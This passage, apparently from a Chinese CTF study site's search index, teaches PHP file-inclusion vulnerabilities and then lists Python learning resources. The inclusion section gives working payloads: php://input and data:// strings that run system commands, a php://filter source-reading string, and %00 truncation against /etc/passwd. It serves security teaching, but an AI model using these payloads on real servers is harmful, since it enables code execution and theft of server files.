<p>\u53ea\u8981\u5c06\u4e00\u4e9b\u91cd\u590d\u4f7f\u7528\u7684\u51fd\u6570\u5199\u5230\u5355\u4e2a\u6587\u4ef6\u4e2d\uff0c\u9700\u8981\u4f7f\u7528\u67d0\u4e2a\u51fd\u6570\u65f6\u5c31\u53ef\u4ee5\u76f4\u63a5\u8c03\u7528\u6b64\u6587\u4ef6\uff0c\u800c\u65e0\u9700\u518d\u6b21\u7f16\u5199\uff0c\u5176\u4e2d\u6587\u4ef6\u8c03\u7528\u7684\u8fc7\u7a0b\u4e00\u822c\u88ab\u79f0\u4e3a\u6587\u4ef6\u5305\u542b\u3002  \uff08\u529f\u80fd\u7c7b\u4f3c<code>python</code>\u4e2d\u7684<code>import</code>\uff0c\u5e94\u8be5\u90fd\u5b66\u4e86\u5427</p>"},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%AF%87/#php","title":"php\u7684\u56db\u79cd\u5305\u542b\u51fd\u6570\u5982\u4e0b","text":"\u51fd\u6570 \u529f\u80fd equire() \u53ea\u8981\u7a0b\u5e8f\u4e00\u8fd0\u884c\u5c31\u5305\u542b\u6587\u4ef6\uff0c\u627e\u4e0d\u5230\u88ab\u5305\u542b\u7684\u6587\u4ef6\u65f6\u4f1a\u4ea7\u751f\u81f4\u547d\u9519\u8bef\uff0c\u5e76\u505c\u6b62\u811a\u672c include() \u6267\u884c\u5230include\u65f6\u624d\u5305\u542b\u6587\u4ef6\uff0c\u627e\u4e0d\u5230\u88ab\u5305\u542b\u6587\u4ef6\u65f6\u53ea\u4f1a\u4ea7\u751f\u8b66\u544a\uff0c\u811a\u672c\u5c06\u7ee7\u7eed\u6267\u884c include_once() \u82e5\u6587\u4ef6\u4e2d\u4ee3\u7801\u5df2\u88ab\u5305\u542b\u5219\u4e0d\u4f1a\u518d\u6b21\u5305\u542b require_once() \u82e5\u6587\u4ef6\u4e2d\u4ee3\u7801\u5df2\u88ab\u5305\u542b\u5219\u4e0d\u4f1a\u518d\u6b21\u5305\u542b <p>\u9664\u6b64\u4e4b\u5916\u8fd8\u6709<code>fopen()</code>\uff0c<code>readfile()</code> </p> <p>\u5f53\u4f7f\u7528\u524d4\u4e2a\u51fd\u6570\u5305\u542b\u4e00\u4e2a\u65b0\u7684\u6587\u4ef6\u65f6\uff0c\u53ea\u8981\u6587\u4ef6\u5185\u5bb9\u7b26\u5408PHP\u8bed\u6cd5\u89c4\u8303\uff0c\u90a3\u4e48\u4efb\u4f55\u6269\u5c55\u540d\u90fd\u53ef\u4ee5\u88abPHP\u89e3\u6790</p>"},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%AF%87/#_2","title":"\u5206\u7c7b","text":"<ol> <li>\u8fdc\u7a0b\u5305\u542b\u4e0e\u672c\u5730\u5305\u542b</li> <li>\u8fdc\u7a0b\u6587\u4ef6\u5305\u542b\uff0c\u9700\u8981<code>php.ini</code>\u5f00\u542f\u4e86<code>allow_url_fopen</code>\u548c<code>allow_url_include</code>\u7684\u914d\u7f6e\u3002\u5305\u542b\u7684\u662f\u7b2c\u4e09\u65b9\u670d\u52a1\u5668\u7684\u6587\u4ef6\u3002</li> <li> <p>\u672c\u5730\u6587\u4ef6\u5305\u542b\u5c31\u662f\u5305\u542b\u672c\u5730\u670d\u52a1\u5668\u7684\u6587\u4ef6</p> </li> <li> <p>\u8fdc\u7a0b\u4e0e\u672c\u5730\u5305\u542b\u7684\u533a\u522b</p> </li> <li>\u672c\u5730\u6587\u4ef6\u5305\u542b\u5c31\u662f\u901a\u8fc7\u6d4f\u89c8\u5668\u5305\u542bweb\u670d\u52a1\u5668\u4e0a\u7684\u6587\u4ef6\uff0c\u8fd9\u79cd\u6f0f\u6d1e\u662f\u56e0\u4e3a\u6d4f\u89c8\u5668\u5305\u542b\u6587\u4ef6\u65f6\u6ca1\u6709\u8fdb\u884c\u4e25\u683c\u7684\u8fc7\u6ee4\u5141\u8bb8\u904d\u5386\u76ee\u5f55\u7684\u5b57\u7b26\u6ce8\u5165\u6d4f\u89c8\u5668\u5e76\u6267\u884c\u3002</li> <li>\u8fdc\u7a0b\u6587\u4ef6\u5305\u542b\u5c31\u662f\u5141\u8bb8\u653b\u51fb\u8005\u5305\u542b\u4e00\u4e2a\u8fdc\u7a0b\u7684\u6587\u4ef6,\u4e00\u822c\u662f\u5728\u8fdc\u7a0b\u670d\u52a1\u5668\u4e0a\u9884\u5148\u8bbe\u7f6e\u597d\u7684\u811a\u672c\u3002\u6b64\u6f0f\u6d1e\u662f\u56e0\u4e3a\u6d4f\u89c8\u5668\u5bf9\u7528\u6237\u7684\u8f93\u5165\u6ca1\u6709\u8fdb\u884c\u68c0\u67e5\uff0c\u5bfc\u81f4\u4e0d\u540c\u7a0b\u5ea6\u7684\u4fe1\u606f\u6cc4\u9732\u3001\u62d2\u7edd\u670d\u52a1\u653b\u51fb\uff0c\u751a\u81f3\u5728\u76ee\u6807\u670d\u52a1\u5668\u4e0a\u6267\u884c\u4ee3\u7801\u3002</li> <li>\u672c\u5730\u6587\u4ef6\u5305\u542b\u4e0e\u8fdc\u7a0b\u6587\u4ef6\u5305\u542b\u6709\u7740\u76f8\u540c\u7684\u539f\u7406\uff0c\u4f46\u524d\u8005\u53ea\u80fd\u5305\u542b\u670d\u52a1\u5668\u4e0a\u5b58\u5728\u7684\u6587\u4ef6\uff0c\u800c\u540e\u8005\u53ef\u4ee5\u5305\u542b\u8fdc\u7a0b\u670d\u52a1\u5668\u4e0a\u7684\u6587\u4ef6\u3002</li> </ol>"},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%AF%87/#_3","title":"\u5371\u5bb3","text":"<p>1\u3001\u8bfb\u53d6web\u914d\u7f6e\u6587\u4ef6\u4ee5\u53ca\u654f\u611f\u7684\u6570\u636e</p> <p>2\u3001web\u670d\u52a1\u5668\u7684\u6587\u4ef6\u88ab\u5916\u754c\u6d4f\u89c8\u5bfc\u81f4\u4fe1\u606f\u6cc4\u9732;</p> <p>3\u3001\u4e0e\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e\u7ec4\u5408getshell\uff0c\u5c06\u6076\u610f\u4ee3\u7801\u6267\u884c\u89e3\u6790</p>"},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%AF%87/#_4","title":"\u6f0f\u6d1e\u5229\u7528","text":""},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%AF%87/#_5","title":"\u4f2a\u534f\u8bae","text":""},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%AF%87/#file","title":"file:// \u534f\u8bae","text":"<p>\u53c2\u8003\uff1a<code>http</code>\u534f\u8bae\u9002\u5408\u9700\u8981\u8fdc\u7a0b\u8bbf\u95ee\u548c\u52a8\u6001\u5185\u5bb9\u7684\u573a\u666f\uff0c\u800c<code>file</code>\u534f\u8bae\u9002\u5408\u5feb\u901f\u8bbf\u95ee\u672c\u5730\u9759\u6001\u6587\u4ef6\u3002</p> <p>\u7528\u4e8e\u8bbf\u95ee\u672c\u5730\u6587\u4ef6\u7cfb\u7edf\uff0c\u901a\u5e38\u7528\u6765\u8bfb\u53d6\u672c\u5730\u6587\u4ef6\u7684\u4e14\u5728php\u4e2d\u4f7f\u7528\u4e0d\u53d7<code>allow_url_fopen</code>\u4e0e<code>allow_url_include</code>\u7684\u5f71\u54cd\u3002 <code>include()</code> <code>require()</code> <code>include_once()</code> <code>require_once()</code>\u53c2\u6570\u53ef\u63a7\u7684\u60c5\u51b5\u4e0b\uff0c\u5982\u5bfc\u5165\u4e3a\u975e<code>.php</code>\u6587\u4ef6\uff0c\u5219\u4ecd\u6309\u7167php\u8bed\u6cd5\u8fdb\u884c\u89e3\u6790\uff0c\u8fd9\u662f<code>include()</code>\u51fd\u6570\u6240\u51b3\u5b9a\u7684\u3002</p> <p>\u8bf4\u660e\uff1a <code>file://</code> \u6587\u4ef6\u7cfb\u7edf\u662f PHP \u4f7f\u7528\u7684\u9ed8\u8ba4\u5c01\u88c5\u534f\u8bae\uff0c\u7528\u4e8e\u5c55\u73b0\u672c\u5730\u6587\u4ef6\u7cfb\u7edf(\u5f53\u7136\u4e0d\u6b62\u53ea\u6709php\u5b58\u5728file\u534f\u8bae)\u3002\u4f7f\u7528 CLI \u7684\u65f6\u5019\uff0c\u76ee\u5f55\u9ed8\u8ba4\u662f\u811a\u672c\u88ab\u8c03\u7528\u65f6\u6240\u5728\u7684\u76ee\u5f55\u3002(\u4e86\u89e3\u4e00\u4e0b\u76f8\u5bf9\u8def\u5f84\u548c\u7edd\u5bf9\u8def\u5f84\uff09\u3002\u5728\u67d0\u4e9b\u51fd\u6570\u91cc\uff0c\u4f8b\u5982 <code>fopen()</code> \u548c <code>file_get_contents()</code>\uff0c<code>include_path()</code>\u4f1a\u53ef\u9009\u5730\u641c\u7d22\uff0c\u4e5f\u4f5c\u4e3a\u76f8\u5bf9\u7684\u8def\u5f84\u3002</p>"},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%AF%87/#php_1","title":"php:// \u534f\u8bae","text":"<p>\u524d\u63d0</p> <p><code>php://input php://stdin php://memory php://temp</code> \u9700\u8981<code>allow_url_include:on</code> </p> <p><code>php://</code> \u7528\u4e8e\u8bbf\u95ee\u5404\u4e2a\u8f93\u5165/\u8f93\u51fa\u6d41\uff08I/O\u6d41\uff09</p> <p>\u5728CTF\u4e2d\u7ecf\u5e38\u4f7f\u7528\u7684\u662f<code>php://filter</code>\u548c<code>php://input</code> </p> <p><code>php://filter</code>\u7528\u4e8e\u8bfb\u53d6\u6e90\u7801\uff0c<code>php://input</code>\u7528\u4e8e\u6267\u884cphp\u4ee3\u7801\u3002</p> \u534f\u8bae \u4f5c\u7528 php://input \u53ef\u4ee5\u8bbf\u95ee\u8bf7\u6c42\u7684\u539f\u59cb\u6570\u636e\u7684\u53ea\u8bfb\u6d41\uff0c\u5728POST\u8bf7\u6c42\u4e2d\u8bbf\u95eePOST\u7684<code>data</code>\u90e8\u5206\uff0c\u5728<code>enctype=\"multipart/form-data\"</code> \u7684\u65f6\u5019<code>php://input</code>\u662f\u65e0\u6548\u7684\u3002 php://output \u53ea\u5199\u7684\u6570\u636e\u6d41\uff0c\u5141\u8bb8\u4ee5 <code>print</code> \u548c <code>echo</code> \u4e00\u6837\u7684\u65b9\u5f0f\u5199\u5165\u5230\u8f93\u51fa\u7f13\u51b2\u533a\u3002 php://fd (&gt;=5.3.6)\u5141\u8bb8\u76f4\u63a5\u8bbf\u95ee\u6307\u5b9a\u7684\u6587\u4ef6\u63cf\u8ff0\u7b26\u3002\u4f8b\u5982 <code>php://fd/3</code> \u5f15\u7528\u4e86\u6587\u4ef6\u63cf\u8ff0\u7b26 3\u3002 php://memory php://temp (&gt;=5.1.0)\u4e00\u4e2a\u7c7b\u4f3c\u6587\u4ef6\u5305\u88c5\u5668\u7684\u6570\u636e\u6d41\uff0c\u5141\u8bb8\u8bfb\u5199\u4e34\u65f6\u6570\u636e\u3002\u4e24\u8005\u7684\u552f\u4e00\u533a\u522b\u662f <code>php://memory</code> \u603b\u662f\u628a\u6570\u636e\u50a8\u5b58\u5728\u5185\u5b58\u4e2d\uff0c\u800c <code>php://temp</code> \u4f1a\u5728\u5185\u5b58\u91cf\u8fbe\u5230\u9884\u5b9a\u4e49\u7684\u9650\u5236\u540e\uff08\u9ed8\u8ba4\u662f <code>2MB</code>\uff09\u5b58\u5165\u4e34\u65f6\u6587\u4ef6\u4e2d\u3002\u4e34\u65f6\u6587\u4ef6\u4f4d\u7f6e\u7684\u51b3\u5b9a\u548c <code>sys_get_temp_dir()</code> \u7684\u65b9\u5f0f\u4e00\u81f4\u3002 php://filter (&gt;=5.0.0)\u4e00\u79cd\u5143\u5c01\u88c5\u5668\uff0c\u8bbe\u8ba1\u7528\u4e8e\u6570\u636e\u6d41\u6253\u5f00\u65f6\u7684\u7b5b\u9009\u8fc7\u6ee4\u5e94\u7528\u3002\u5bf9\u4e8e\u4e00\u4f53\u5f0f<code>\uff08all-in-one\uff09</code>\u7684\u6587\u4ef6\u51fd\u6570\u975e\u5e38\u6709\u7528\uff0c\u7c7b\u4f3c <code>readfile()</code>\u3001<code>file()</code> \u548c <code>file_get_contents()</code>\uff0c\u5728\u6570\u636e\u6d41\u5185\u5bb9\u8bfb\u53d6\u4e4b\u524d\u6ca1\u6709\u673a\u4f1a\u5e94\u7528\u5176\u4ed6\u8fc7\u6ee4\u5668\u3002"},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%AF%87/#phpinput","title":"php://input","text":"<p>\u4e3e\u4e2a\u4f8b\u5b50</p> <p>URL\uff1a</p> <p><code>http://localhost/include/file.php?file=php://input</code></p> <p>POST\uff1a</p> <p><code>&lt;?php system('ipconfig');?&gt;</code></p> <p>\u4f1a\u628aPOST\u7684\u8bf7\u6c42\u5185\u5bb9\u5f53\u4f5cphp\u4ee3\u7801\u6267\u884c</p>"},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%AF%87/#phpfilter","title":"php://filter","text":"<p>\u5728ctf\u4e2d\u4f7f\u7528\u7684\u6bd4\u8f83\u5e7f\uff08\u4e3b\u8981\u76ee\u7684\u662f\u83b7\u53d6flag\uff0c\u6240\u4ee5\u8bfb\u53d6\u6587\u4ef6\u6e90\u7801\u7684\u529f\u80fd\u5c31\u5f88\u5fc5\u8981\uff09</p> <p>\u53c2\u6570\u8be6\u89e3</p> <p>\u4e3e\u4e2a\u4f8b\u5b50</p> <p><code>php://filter/convert.base64-encode/resource=./flag.php</code></p> <p>\u4f1a\u8bfb\u53d6\u5f53\u524d\u76ee\u5f55\u7684<code>flag.php</code>\u6587\u4ef6\u7684\u6e90\u7801\uff0c\u5e76\u4e14\u4ee5base64\u7f16\u7801\u7684\u5f62\u5f0f\u5c55\u793a\u51fa\u6765\uff0c\u9632\u6b62\u81ea\u52a8\u6e32\u67d3</p> <p>tips\uff1a\u53ef\u4ee5\u5305\u542b\u65e5\u5fd7\u6587\u4ef6</p> <p>\u51e0\u4e4e\u6240\u6709\u7f51\u7ad9\u90fd\u4f1a\u5c06\u7528\u6237\u7684\u8bbf\u95ee\u8bb0\u5f55\u5230\u8bbf\u95ee\u65e5\u5fd7\u4e2d\uff0cctf\u8d5b\u9898\u4e0d\u4e00\u5b9a</p> php://filter \u53c2\u6570 \u63cf\u8ff0 resource=&lt;\u8981\u8fc7\u6ee4\u7684\u6570\u636e\u6d41&gt; \u5fc5\u987b\u9879\u3002\u5b83\u6307\u5b9a\u4e86\u4f60\u8981\u7b5b\u9009\u8fc7\u6ee4\u7684\u6570\u636e\u6d41\u3002 read=&lt;\u8bfb\u94fe\u7684\u8fc7\u6ee4\u5668&gt; \u53ef\u9009\u9879\u3002\u53ef\u4ee5\u8bbe\u5b9a\u4e00\u4e2a\u6216\u591a\u4e2a\u8fc7\u6ee4\u5668\u540d\u79f0\uff0c\u4ee5\u7ba1\u9053\u7b26\uff08/\uff09\u5206\u9694\u3002 write=&lt;\u5199\u94fe\u7684\u8fc7\u6ee4\u5668&gt; \u53ef\u9009\u9879\u3002\u53ef\u4ee5\u8bbe\u5b9a\u4e00\u4e2a\u6216\u591a\u4e2a\u8fc7\u6ee4\u5668\u540d\u79f0\uff0c\u4ee5\u7ba1\u9053\u7b26\uff08/\uff09\u5206\u9694\u3002 convert.base64-encode&lt;\u4e24\u4e2a\u94fe\u7684\u8fc7\u6ee4\u5668&gt; \u4efb\u4f55\u6ca1\u6709\u4ee5 read= \u6216 write= \u4f5c\u524d\u7f00\u7684\u7b5b\u9009\u5668\u5217\u8868\u4f1a\u89c6\u60c5\u51b5\u5e94\u7528\u4e8e\u8bfb\u6216\u5199\u94fe\u3002 \u5b57\u7b26\u4e32\u8fc7\u6ee4\u5668 \u4f5c\u7528 string.rot13 \u7b49\u540c\u4e8e<code>str_rot13()</code>\uff0crot13\u53d8\u6362 string.toupper \u7b49\u540c\u4e8e<code>strtoupper()</code>\uff0c\u8f6c\u5927\u5199\u5b57\u6bcd string.tolower \u7b49\u540c\u4e8e<code>strtolower()</code>\uff0c\u8f6c\u5c0f\u5199\u5b57\u6bcd string.strip_tags \u7b49\u540c\u4e8e<code>strip_tags()</code>\uff0c\u53bb\u9664html\u3001PHP\u8bed\u8a00\u6807\u7b7e \u8f6c\u6362\u8fc7\u6ee4\u5668 \u4f5c\u7528 convert.base64-encode &amp; convert.base64-decode \u7b49\u540c\u4e8e<code>base64_encode()</code>\u548c<code>base64_decode()</code>\uff0cbase64\u7f16\u7801\u89e3\u7801 convert.quoted-printable-encode &amp; convert.quoted-printable-decode quoted-printable \u5b57\u7b26\u4e32\u4e0e 8-bit \u5b57\u7b26\u4e32\u7f16\u7801\u89e3\u7801 \u538b\u7f29\u8fc7\u6ee4\u5668 \u4f5c\u7528 zlib.deflate &amp; zlib.inflate \u5728\u672c\u5730\u6587\u4ef6\u7cfb\u7edf\u4e2d\u521b\u5efa gzip \u517c\u5bb9\u6587\u4ef6\u7684\u65b9\u6cd5\uff0c\u4f46\u4e0d\u4ea7\u751f\u547d\u4ee4\u884c\u5de5\u5177\u5982 gzip\u7684\u5934\u548c\u5c3e\u4fe1\u606f\u3002\u53ea\u662f\u538b\u7f29\u548c\u89e3\u538b\u6570\u636e\u6d41\u4e2d\u7684\u6709\u6548\u8f7d\u8377\u90e8\u5206\u3002 bzip2.compress &amp; bzip2.decompress \u540c\u4e0a\uff0c\u5728\u672c\u5730\u6587\u4ef6\u7cfb\u7edf\u4e2d\u521b\u5efa bz2 \u517c\u5bb9\u6587\u4ef6\u7684\u65b9\u6cd5\u3002 \u52a0\u5bc6\u8fc7\u6ee4\u5668 \u4f5c\u7528 mcrypt.* libmcrypt \u5bf9\u79f0\u52a0\u5bc6\u7b97\u6cd5 mdecrypt.* libmcrypt \u5bf9\u79f0\u89e3\u5bc6\u7b97\u6cd5 <p>\u66f4\u591a\u8fc7\u6ee4\u5668</p>"},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%AF%87/#data","title":"data:// \u534f\u8bae","text":"<p>\u524d\u63d0</p> <p><code>allow_url_fopen:on</code>  \u4ee5\u53ca<code>allow_url_include:on</code> <code>PHP&gt;=5.2.0</code></p> <p>\u53ef\u4ee5\u4f7f\u7528<code>data://</code>\u6570\u636e\u6d41\u5c01\u88c5\u5668\uff0c\u4ee5\u4f20\u9012\u76f8\u5e94\u683c\u5f0f\u7684\u6570\u636e\u3002</p> <p>\u901a\u5e38\u53ef\u4ee5\u7528\u6765\u6267\u884cPHP\u4ee3\u7801</p> <p><code>data://text/plain,&lt;?php%20phpinfo();?&gt;</code></p> <p>\u4e3e\u4e2a\u4f8b\u5b50\uff1a</p> <p>Payload</p> <p>\u76f4\u63a5\u6267\u884c\u547d\u4ee4</p> <p><code>data:text/plain,&lt;?php system(whoami)?&gt;</code></p> <p><code>data:text/plain;base64,PD9waHAgc3lzdGVtKHdob2FtaSk/Pg==</code></p> <p>\u56fe\u7247\u9a6c\u6267\u884c\u547d\u4ee4</p> <p>Payload\uff1a</p> <p><code>data://image/jpeg;base64,..... #\u56fe\u7247\u9a6c\u7684base64</code></p>"},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%AF%87/#phar","title":"phar:// \u534f\u8bae","text":"<p>\u5176\u5b9e\u4e25\u683c\u6765\u8bf4\u662fphp\u53cd\u5e8f\u5217\u5316\u7684\u6f0f\u6d1e\uff0c\u4e0d\u8fc7\u4e0d\u9700\u8981<code>unserialize()</code></p> <p>phar\u7684\u6587\u4ef6\u7ed3\u6784</p> <p>stub\uff08\u5f15\u5bfc\u5934\uff09</p> <p>\u53ef\u4ee5\u7406\u89e3\u4e3a\u4e00\u4e2a\u6807\u5fd7\uff0c\u7c7b\u4f3cELF\u6587\u4ef6\u7684\u9b54\u6570\uff0c\u4e5f\u5c31\u662f\u6587\u4ef6\u5934</p> <p>\u683c\u5f0f\u4e3a<code>xxx&lt;?php xxx; __HALT_COMPILER();?&gt;</code>\uff0c\u4ee5<code>__HALT_COMPILER();?&gt;</code>\u6765\u7ed3\u5c3e\uff0c</p> <p>phar\u6269\u5c55\u4ee5\u8fd9\u4e2a\u6807\u5fd7\u6765\u8bc6\u522b\u6587\u4ef6\u662f\u5426\u4e3aphar\u6587\u4ef6</p>"},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%AF%87/#manifest","title":"manifest(\u5143\u6570\u636e)","text":"<p>\u8fd9\u91cc\u5b58\u653e\u6838\u5fc3\u6570\u636e</p> <p>\u6587\u4ef6\u4fe1\u606f\uff08\u6587\u4ef6\u540d\u3001\u5927\u5c0f\u3001\u6743\u9650\u7b49</p> <p>\u4e3b\u8981\u8fd9\u90e8\u5206\u4f1a\u4ee5\u5e8f\u5217\u5316\u7684\u5f62\u5f0f\u5b58\u50a8\u7528\u6237\u81ea\u5b9a\u4e49\u7684<code>meta-data</code></p> <p>\u89e3\u6790Manifest\u65f6\u81ea\u52a8\u8c03\u7528<code>unserialize()</code>\uff0c\u6f0f\u6d1e\u89e6\u53d1\u70b9</p>"},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%AF%87/#contents","title":"contents(\u6587\u4ef6\u5185\u5bb9)","text":"<p>\u4e00\u4e9b\u88ab\u538b\u7f29\u7684\u8d44\u6e90\uff0c\u56fe\u7247\uff0cphp\u7b49</p>"},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%AF%87/#signature","title":"signature(\u7b7e\u540d)","text":"<p>\u7528\u4e8e\u9a8c\u8bc1\u6587\u4ef6\u5b8c\u6574\u6027\u7684\u7b7e\u540d</p> <p>\u4e3b\u8981\u6f0f\u6d1e\u51fa\u73b0\u5728<code>manifest</code>\u4e2d\u7684<code>meta-data</code>,\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u7684\u90e8\u5206\u653e\u5230\u53cd\u5e8f\u5217\u5316\u6765\u8bb2</p>"},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%AF%87/#bypass","title":"\u6f0f\u6d1ebypass","text":""},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%AF%87/#00","title":"00\u5b57\u7b26\u622a\u65ad","text":"<p>(PHP&lt;5.3.4)</p> <p>\u6587\u4ef6\u4e0a\u4f20\u6709\u5199</p> <p>\u7528\u4e8e\u622a\u65adfile\u53d8\u91cf\u4e4b\u540e\u7684\u5b57\u7b26\u4e32</p> <p><code>../etc/passwd</code></p> <p>\u901a\u8fc7web\u8f93\u5165\u65f6</p> <p><code>../etc/passwd%00</code></p> <p>\u53c2\u8003</p>"},{"location":"python/","title":"Index","text":"<p> \u7ea6 132 \u4e2a\u5b57  1 \u5f20\u56fe\u7247  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4\u4e0d\u5230 1 \u5206\u949f</p>"},{"location":"python/#python","title":"\u4e3a\u4ec0\u4e48\u8981\u5b66Python","text":"<p>Python\u5bf9\u4e8e\u4e00\u540dCTFer\uff0c\u5404\u79cd\u65b9\u4fbf\u7684\u5e93\uff0c\u4e30\u5bcc\u7684\u5185\u7f6e\u51fd\u6570\u4f7f\u7528\u8d77\u6765\u5b9e\u5728\u662f\u975e\u5e38\u65b9\u4fbf</p> <p>\u5bf9\u4e8e\u4e00\u540d\u7a0b\u5e8f\u5458\uff0c\u4f5c\u4e3a\u4e00\u79cd\u811a\u672c\u8bed\u8a00\u4e5f\u662f\u975e\u5e38\u68d2\u7684</p> <p>Python\u6700\u5927\u7684\u597d\u5904\u4e4b\u4e00\u662f\u6613\u4e8e\u5b66\u4e60\u4e14\u5e94\u7528\u8da3\u5473\u6027\u5f3a</p> Quote <p>\u57282022\u5e7412\u6708 \u6700\u65b0\u7684TIOBE\u6307\u6570\u699c\u5355 https://www.tiobe.com/tiobe-index/ \u6807\u9898\u540d\u4e3aDecember Headline: Python, C and C++ competing for language of the year award Python\u4f5c\u4e3a\u4e16\u754c\u4e0a\u6700\u53d7\u6b22\u8fce\u7684\u7f16\u7a0b\u8bed\u8a00\uff0c\u5df2\u7ecf\u5728\u699c\u4e00\u5e74\u6709\u4f59 </p>"},{"location":"python/How%20to%20Learn/","title":"\u5982\u4f55\u5b66\u4e60Python","text":"<p> \u7ea6 599 \u4e2a\u5b57  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 2 \u5206\u949f</p> <p> </p> <p>\u81ea\u8ba4\u4e3a\u6ca1\u6709\u80fd\u529b\u5199\u4e00\u5957\u5b66\u4e60\u7684\u6559\u7a0b \u5728\u8fd9\u91cc\u63a8\u8350\u4e00\u4e9b\u5b66\u4e60\u6559\u7a0b,\u5b66\u4e60\u8d44\u6599\uff0c\u4ee5\u53ca\u5b66\u4e60\u65b9\u6cd5</p>"},{"location":"python/How%20to%20Learn/#_1","title":"\u5b66\u4e60\u6559\u7a0b","text":"<ul> <li>b\u7ad9UP\u4e3b \u6797\u7c92\u7c92\u5440  \u7684  \u4f60\u89c9\u5f97\u81ea\u5df1\u8fd9\u8f88\u5b50\u90fd\u5b66\u4e0d\u4f1a\u7f16\u7a0b\uff1f\u8d85\u8d85\u8d85\u57fa\u7840Python\u8bfe\u7a0b\uff0c3\u5c0f\u65f6\u5feb\u901f\u5165\u95e8 \u3010\u81ea\u5b66Python\u6559\u7a0b\u5408\u96c6\u3011</li> </ul> <p>\u5199\u7684\u975e\u5e38\u57fa\u7840\u6613\u61c2\uff0c\u7528\u4e8e\u5165\u95e8\u5f88\u5408\u9002</p> <ul> <li> <p>Github \u670913K Star\u7684\u8d85\u591a\u4eba\u63a8\u8350\u81ea\u5b66\u6559\u7a0b Python - 100\u5929\u4ece\u65b0\u624b\u5230\u5927\u5e08</p> </li> <li> <p>\u77e5\u4e4e\u4e13\u680f \u4ece\u96f6\u5f00\u59cb\u5b66Python</p> </li> <li> <p>b\u7ad9UP\u4e3b \u5343\u950bpython \u7684Python\u96f6\u57fa\u7840\u6559\u7a0b\u5feb\u901f\u4e0a\u624b_\u5168\u7a0b\u5e72\u8d27+\u5b9e\u7528\u6280\u5de7\u5c0f\u767d\u5fc5\u770b</p> </li> </ul> <p>\u200b   \u8fd9\u4e09\u4e2a\u662f\u540c\u4e00\u4e2a\u4f5c\u8005\u7684</p> <ul> <li>\u4e2d\u56fd\u5927\u5b66 mooc - \u6d59\u6c5f\u5927\u5b66 Python \u7a0b\u5e8f\u8bbe\u8ba1</li> </ul>"},{"location":"python/How%20to%20Learn/#_2","title":"\u5b66\u4e60\u8d44\u6599","text":"<ul> <li>\u8fde\u7eed\u591a\u5e74\u88ab\u54c8\u4f5b\u5927\u5b66\u5b66\u751f\u8bc4\u4e3a\u6700\u53d7\u6b22\u8fce\u7684\u516c\u9009\u8bfe\u7a0b \uff08\u4f46\u662f\u82f1\u8bed\uff09 CS50: This is CS50x</li> <li>\u300aPython \u7f16\u7a0b\uff1a\u4ece\u5165\u95e8\u5230\u5b9e\u8df5\u300bISBN 978-7-115-54608-1</li> <li>Python 3 \u83dc\u9e1f\u6559\u7a0b runoob.com/python3/python3-tutorial.html</li> <li>Python \u5b98\u65b9\u6587\u6863 tutorial docs.python.org/3/tutorial</li> <li>Python3 \u901f\u67e5\u5361 https://perso.limsi.fr/pointal/_media/python:cours:mementopython3-zh_cn.pdf</li> 